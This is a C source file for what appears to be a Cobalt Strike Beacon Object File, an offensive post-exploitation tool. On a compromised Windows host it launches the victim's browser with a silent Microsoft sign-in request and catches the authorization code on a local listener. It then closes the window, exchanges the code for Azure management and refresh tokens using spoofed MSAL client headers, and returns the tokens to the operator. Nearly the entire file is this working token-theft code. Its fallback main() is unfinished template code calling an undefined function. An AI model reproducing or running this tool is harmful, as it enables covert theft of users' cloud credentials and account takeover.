#include <windows.h>
#include "beacon.h"
#include "bofdefs.h"
#include "base.c"


char fmtString[] = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=%s&response_type=code&redirect_uri=http://localhost:%d&prompt=none%s%s&response_mode=query&scope=%s&state=12345&code_challenge=%s&code_challenge_method=S256";
const char allowed_chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~";

typedef struct _ctx {
	HANDLE listening; //event set when we start listening and port has been set.
	char PKCE[129];
	char hashedPKCE[32];
	char base64PKCE[46]; //45 for null term
	char state[50];
	char tokens[16184];
	char* authcode;
	char* error;
	char* error_desc;
	DWORD tokensLen;
	unsigned short timeout;
	unsigned short port;
}ctx;

typedef enum _browser {
	EDGE,
	CHROME,
	DEFAULT,
	OTHER
}browserType;

typedef struct _flow_args {
	const char* client_id;
	const char* scope;
	const char* hint;
	browserType browser;
	const char* browser_path; //only used when browser is OTHER
	
}flow_args;

#define CHECK_RETURN_FAIL(x) { \
	HRESULT hr = x; \
	if(FAILED(hr)) \
	{		BeaconPrintf(CALLBACK_ERROR, "[!] %s failed: 0x%08lx\n", #x, hr); \
		goto fail; \
	} \
}

#define CHECK_RETURN_FAIL_BOOL(x) { \
	if(!x) \
	{ \
		BeaconPrintf(CALLBACK_ERROR, "[!] %s failed: %d\n", #x, KERNEL32$GetLastError()); \
		goto fail; \
	} \
}

#define CHECK_RETURN_NULL(x) ({ \
	void * h = (x); \
	if(h == NULL) \
	{\
		BeaconPrintf(CALLBACK_ERROR, "[!] %s failed: %d\n", #x, KERNEL32$GetLastError()); \
		goto fail; \
	}\
	h; \
})

#pragma region utils
void GeneratePKCE(char* PKCE)
{
	if (PKCE == NULL) return;
	unsigned char randomdata[129];
	RtlGenRandom(randomdata, 129);
	int length = (randomdata[0] % 85) + 43; //length is random string between 43-128
	for (int i = 1; i <= length; i++)
	{
		PKCE[i -1] = allowed_chars[randomdata[i] % (sizeof(allowed_chars) - 1)];
	}
}

//We're just going to check status in calling func for this
void ConvertToChallenge(ctx * context)
{
	BCRYPT_ALG_HANDLE alg;
	BCRYPT_HASH_HANDLE hHash;
	BCRYPT$BCryptOpenAlgorithmProvider(&alg, BCRYPT_SHA256_ALGORITHM, NULL, 0);
	BCRYPT$BCryptCreateHash(alg, &hHash, NULL, 0, NULL, 0, 0);
	DWORD length = MSVCRT$strnlen(context->PKCE, 128);
	BCRYPT$BCryptHashData(hHash, context->PKCE, length, 0);
	BCRYPT$BCryptFinishHash(hHash, context->hashedPKCE, 32, 0);
	BCRYPT$BCryptDestroyHash(hHash);
	BCRYPT$BCryptCloseAlgorithmProvider(alg, 0);
	CRYPT32$CryptBinaryToStringA(context->hashedPKCE, 32, CRYPT_STRING_BASE64URI | CRYPT_STRING_NOCRLF, context->base64PKCE, &length);

}
#pragma endregion

#pragma region server
BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam){
    char WindowName[128] = {0};
	const char * host = (const char *)lParam;
    DWORD WinLen = USER32$GetWindowTextA(hwnd, WindowName, 127);

    if (WindowName[0] != 0 && WinLen){
		if(MSVCRT$strstr(WindowName, host) != NULL || MSVCRT$strstr(WindowName, "Redirecting") != NULL )
		{
			DWORD_PTR result = 0;
			USER32$SendMessageTimeoutW(hwnd, WM_CLOSE, 0, 0, SMTO_ABORTIFHUNG, 500, &result);
			return 0;
		}
    }
    return 1;
}


static void SendMsg(SOCKET s)
{
	char msg[] = "HTTP/1.1 200 OK\r\n\
Content-Type: text/html\r\n\
\r\n\
<html><body><script>window.onload = function() {window.close();};</script></body></html>";
	WS2_32$send(s, msg, sizeof(msg) - 1, 0);
	WS2_32$closesocket(s);
}

DWORD GetCode(SOCKET s, ctx * context)
{
	char *buffer = intAlloc(16184);
	//this likely needs to be more robust, but starting here... famous last words
	int size = WS2_32$recv(s, buffer, 16183, 0); 
	SendMsg(s);
	//figure out where the newline is, that should be our GET line w/ params
	//buffer[sizeof(buffer) - 1] = 0; //null off so strchr usage is safe
	//BeaconPrintf(CALLBACK_OUTPUT, "got back buffer of %s\n", buffer);
	char * end = MSVCRT$strchr(buffer, '\n');
	if(end == NULL)
	{
		intFree(buffer);
		return FALSE;
	}
	char* start = buffer;
	//char * authcode[]
	while (*start != '?' && start != end)
	{
		start++;
	}
	if (start == end)
	{
		intFree(buffer);
		return FALSE; //
	}
	start++; //start now points at first param
	while (*end != ' ')
	{
		end--;
	}
	//end now points at space between path and HTTP
	*end = 0;
	while (start < end)
	{
		if (MSVCRT$strncmp(start, "code=", 5) == 0)
		{
			start += 5;
			char* strend = start;
			while (*strend != '&' && strend != end)
			{
				strend++;
			}
			DWORD size = strend - start;
			context->authcode = intAlloc(size + 1);
			MSVCRT$memcpy(context->authcode, start, size);
			break;
		}
		else if(MSVCRT$strncmp(start, "error=", 6) == 0)
		{ 
			start += 6;
			char* strend = start;
			while (*strend != '&' && strend != end)
			{
				strend++;
			}
			DWORD size = strend - start;
			context->error = intAlloc(size + 1);
			MSVCRT$memcpy(context->error, start, size);
		}
		else if (MSVCRT$strncmp(start, "error_description=", 18) == 0)
		{
			start += 18;
			char* strend = start;
			while (*strend != '&' && strend != end)
			{
				strend++;
			}
			DWORD size = strend - start;
			context->error_desc = intAlloc(size + 1);
			MSVCRT$memcpy(context->error_desc, start, size);
		}
		//something else was there got to & or end
		for (; *start != '&' && start <= end; start++); //intentional ; at end
		start++; //if we were at & this jumps us over, if we were at end this doesn't matter we still exit
	}
	char host[64] = {0};
	MSVCRT$_snprintf(host, 63, "localhost:%d", context->port);
	//check that our window actually closed, otherwise send it a close msg
	USER32$EnumDesktopWindows(NULL,(WNDENUMPROC)EnumWindowsProc,(LPARAM)host);
	intFree(buffer);
	return 0;


}

//Normally you would never use a thread in a bof, but we're going to kill this thread / clean up before exiting
DWORD WINAPI ListenServer(void * _ctx)
{
	ctx* context = (ctx*)_ctx;
	int bindval = SOCKET_ERROR;
	struct sockaddr_in localaddr = { 0 };
	SOCKET s = 0;
	int tries = 0;
	while (bindval == SOCKET_ERROR) //Code this as a loop  so if our port happens to be taken we retry;
	{
		tries++;
		if(tries > 100)
		{
			BeaconPrintf(CALLBACK_ERROR, "This shouldn't be hit but we can't bind a socket so bailing");
			return 0;
		}
		s = WS2_32$socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		RtlGenRandom(&(context->port), 2);
		context->port = (context->port % 30000) + (u_short)30000;
		localaddr.sin_port = WS2_32$htons(context->port);
		localaddr.sin_family = AF_INET;
		localaddr.sin_addr.s_addr = WSOCK32$inet_addr("127.0.0.1");
		bindval = WS2_32$bind(s, (struct sockaddr *)&localaddr, sizeof(struct sockaddr_in));
		if (bindval == SOCKET_ERROR)
		{
			WS2_32$closesocket(s);
			continue;
		}
		if (WS2_32$listen(s, 1) == SOCKET_ERROR)
		{
			bindval = SOCKET_ERROR;
			WS2_32$closesocket(s);
			continue;
		}

	}
	KERNEL32$SetEvent(context->listening); //notify client we're ready to rock and port is populated
	//We're only going to accept the first connection and process it, breaking into a func for potential future reuse
	SOCKET client = WS2_32$accept(s, NULL, NULL); // its us connecting so we don't need that info
	GetCode(client, context); //GetCode closes the clietn socket
	WS2_32$closesocket(s);
	return 0;
}

#pragma endregion

#pragma region client


int RequestToken(
	flow_args* args,
	ctx* context
)
{
	//client_id, scope, code, redir_uri, plaintext PKCE
	char redir_uri[64] = { 0 };
	const char * postFmt = "client_id=%s&scope=%s&code=%s&redirect_uri=%s&grant_type=authorization_code&code_verifier=%s";
	char * postData = intAlloc(4096);
	MSVCRT$_snprintf(redir_uri, 64, "%s%d", "http%3A%2F%2Flocalhost%3A", context->port);
	DWORD length = MSVCRT$_snprintf(postData, 4096, postFmt, args->client_id, "https%3A%2F%2Fmanagement.core.windows.net%2F%2F.default+offline_access+openid+profile", context->authcode, redir_uri, context->PKCE);
	//Might want to check that user agent
	HANDLE hSession = CHECK_RETURN_NULL(WINHTTP$WinHttpOpen(L"azsdk-net-Identity.Broker/1.1.0 (.NET 9.0.1; ur mum Edition)",
		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		NULL,
		WINHTTP_NO_PROXY_BYPASS,
		0));
	HINTERNET hConnect = CHECK_RETURN_NULL(WINHTTP$WinHttpConnect(hSession, L"login.microsoftonline.com", INTERNET_DEFAULT_HTTPS_PORT,
		0));
	HINTERNET hRequest = CHECK_RETURN_NULL(WINHTTP$WinHttpOpenRequest(hConnect, L"POST", L"/common/oauth2/v2.0/token", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE));
	CHECK_RETURN_FAIL_BOOL(WINHTTP$WinHttpAddRequestHeaders(hRequest, L"x-client-SKU: MSAL.CoreCLR\r\n\
x-client-Ver: 7.65.0.0\r\n\
x-client-OS: Windows\r\n\
x-anchormailbox: oid:6d0098a1-0d29-43b0-0000-c267d70b3f21@4508ba81-0000-0056-9100-976e004aed1e\r\n\
x-client-current-telemetry: 2|1005,0,,,|1,1,1,,\r\n\
x-ms-lib-capability: retry-after, h429\r\n\
client-request-id: 78000e7f-4e21-4054-bb00-9625900216c2\r\n\
return-client-request-id: true\r\n\
x-ms-client-request-id: 78000e7f-4e21-4054-bb00-9625900216c2\r\n\
x-ms-return-client-request-id: true\r\n\
Content-Type: application/x-www-form-urlencoded",
-1,
WINHTTP_ADDREQ_FLAG_ADD));
	CHECK_RETURN_FAIL_BOOL(WINHTTP$WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, postData, length, length, 0));
	CHECK_RETURN_FAIL_BOOL(WINHTTP$WinHttpReceiveResponse(hRequest, NULL));
	CHECK_RETURN_FAIL_BOOL(WINHTTP$WinHttpReadData(hRequest, context->tokens, 16184, &(context->tokensLen)));
	fail:
	if (postData) intFree(postData);
	if (hRequest) WINHTTP$WinHttpCloseHandle(hRequest);
	if (hConnect) WINHTTP$WinHttpCloseHandle(hConnect);
	if (hSession) WINHTTP$WinHttpCloseHandle(hSession);
}	


void StartAuthCodeFlow(flow_args * args, ctx * context)
{
	//Generate PKCE
	char auth_uri[512] = { 0 }; 
	char browser_path[MAX_PATH] = {0};
	if (context == NULL)
	{
		return;
	}
	GeneratePKCE(context->PKCE);
	if(context->PKCE[0] == '\0')
	{
		BeaconPrintf(CALLBACK_ERROR, "Failed to generate PKCE code");
		return;
	}
	ConvertToChallenge(context);
	if(context->base64PKCE[0] == '\0')
	{
		BeaconPrintf(CALLBACK_ERROR, "Failed to generate base64 of hashed PKCE code");
		return;
	}
	HANDLE hThread = (HANDLE)MSVCRT$_beginthreadex(NULL, 0, (_beginthreadex_proc_type)ListenServer, (void*)context, 0, NULL);
	if (KERNEL32$WaitForSingleObject(context->listening, 30000) == WAIT_OBJECT_0)
	{
		BOOL hasHint = args->hint != NULL;
		MSVCRT$_snprintf(auth_uri, sizeof(auth_uri), fmtString, args->client_id, context->port, (hasHint) ? "&login_hint=" : "",
			(hasHint) ? args->hint : "", args->scope, context->base64PKCE);
		
		switch (args->browser)
		{
			case DEFAULT:
				SHELL32$ShellExecuteA(NULL, "open", auth_uri, NULL, NULL, SW_SHOWNORMAL);
				break;
			case EDGE:
				MSVCRT$strcpy(browser_path, "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe");
				//Intentional fall through
			case CHROME:
				if(*browser_path == '\0')
				{
					MSVCRT$strcpy(browser_path, "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe");
				}
				//Intentional fall through
			case OTHER:
			{
				if(*browser_path == '\0')
				{

					MSVCRT$strcpy(browser_path, args->browser_path);
				}
				char * arguments = intAlloc(4096);
				MSVCRT$strcat(arguments, "--app=\"");
				MSVCRT$strcat(arguments, auth_uri);
				MSVCRT$strcat(arguments, "\"");
				internal_printf("executing %s %s\n", browser_path, arguments);
				SHELL32$ShellExecuteA(NULL, "open", browser_path, arguments, NULL, SW_SHOWNORMAL);
				intFree(arguments);
				break;
			}
			default:
			{
				BeaconPrintf(CALLBACK_ERROR, "Invalid value given for browser");
				break; //We shouldn't get here but we'll handle it regardless
			}
		}
	}
	else
	{
		BeaconPrintf(CALLBACK_ERROR, "Listen event failed to trigger");
	}
	if (KERNEL32$WaitForSingleObject(hThread, 10000) == WAIT_OBJECT_0)
	{
		if(context->authcode)
		{
			internal_printf("[+] Got authcode now requesting tokens\n");
			RequestToken(args, context);

		}
		else
		{
			BeaconPrintf(CALLBACK_ERROR, "Failed to receive auth code, unable to proceed");
		}
	}
	else
	{
		BeaconPrintf(CALLBACK_ERROR, "local server did not stop, force killing it and bailing");
		KERNEL32$TerminateThread(hThread, 1);
	}
	KERNEL32$CloseHandle(hThread);

}

#pragma endregion



#ifdef BOF
VOID go( 
	IN PCHAR Buffer, 
	IN ULONG Length 
) 
{
	//validate browser path < max path
	datap parser = {0};
	flow_args * args = intAlloc(sizeof(flow_args));
	ctx * context = intAlloc(sizeof(ctx));
	context->listening = KERNEL32$CreateEventA(NULL, TRUE, FALSE, NULL);
	BeaconDataParse(&parser, Buffer, Length);
	args->client_id = BeaconDataExtract(&parser, NULL);
	args->scope = BeaconDataExtract(&parser, NULL);
	args->browser = (browserType)BeaconDataInt(&parser);
	args->hint = BeaconDataExtract(&parser, NULL);
	int bplen = 0;
	args->browser_path = BeaconDataExtract(&parser, &bplen);
	if(bplen > MAX_PATH)
	{
		BeaconPrintf(CALLBACK_ERROR, "provided browser path is to long, just be <= 260");
		goto final;
	}
	args->browser_path = (args->browser_path[0]) ? args->browser_path : NULL;
	args->hint = (args->hint[0]) ? args->hint : NULL;
	
	if(args->browser == OTHER && args->browser_path == NULL)
	{
		BeaconPrintf(CALLBACK_ERROR, "Unable to use OTHER (3) for browser when path isn't specified");
		goto final;
	}
	if(args->browser > OTHER)
	{
		BeaconPrintf(CALLBACK_ERROR, "Invalid value for browser\n");
		goto final;
	}

	if(!bofstart())
	{
		BeaconPrintf(CALLBACK_ERROR, "bof startup fail");
		//goto final;
	}

	//This could be an p2p agent or external c2. We might also kill / exit at weird points so managing this from our "entrypoint"
	WSADATA wsdata = { 0 };
	WS2_32$WSAStartup(MAKEWORD(2, 2), &wsdata);
	StartAuthCodeFlow(args, context);
	if(context->tokens[0])
	{
		internal_printf("\n---\n%s\n---", context->tokens);
	}
	else if(context->error)
	{
		BeaconPrintf(CALLBACK_ERROR, "Fail: %s (%s)", context->error, (context->error_desc) ? context->error_desc : "No description available");
	}

// go_end:

	printoutput(TRUE);
	WS2_32$WSACleanup();
	bofstop();
	final:
	intFree(args);
	KERNEL32$CloseHandle(context->listening);
	if(context->error) intFree(context->error);
	if(context->error_desc) intFree(context->error_desc);
	if(context->authcode) intFree(context->authcode);
	intFree(context);
};
#else
#define TEST_STRING_ARG "TEST_STRING_ARG"
#define TEST_INT_ARG 12345
int main(int argc, char ** argv)
{
	DWORD dwErrorCode = ERROR_SUCCESS;
	const char * string_arg = TEST_STRING_ARG;
	int int_arg = TEST_INT_ARG;

	internal_printf("Calling YOUNAMEHERE with arguments %s and %d\n", string_arg, int_arg );

	dwErrorCode = YOUNAMEHERE(string_arg, int_arg);
	if(ERROR_SUCCESS != dwErrorCode)
	{
		BeaconPrintf(CALLBACK_ERROR, "YOUNAMEHERE failed: %lX\n", dwErrorCode);	
		goto main_end;
	}

	internal_printf("SUCCESS.\n");

main_end:

	return dwErrorCode;
}
#endif